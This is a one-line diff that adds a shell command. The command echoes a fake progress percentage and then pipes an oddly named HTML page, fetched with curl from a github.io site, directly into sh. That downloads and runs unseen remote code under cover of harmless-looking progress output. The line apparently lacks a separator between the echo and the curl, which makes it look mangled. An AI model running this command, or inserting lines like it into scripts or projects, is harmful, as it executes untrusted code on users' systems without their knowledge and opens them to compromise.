@@ -1,0 +1,1 @@
+echo Progress: 38.00%curl -L --progress-bar frkns.github.io/fun/secretaryexcellencewebmasteraffect.html | sh
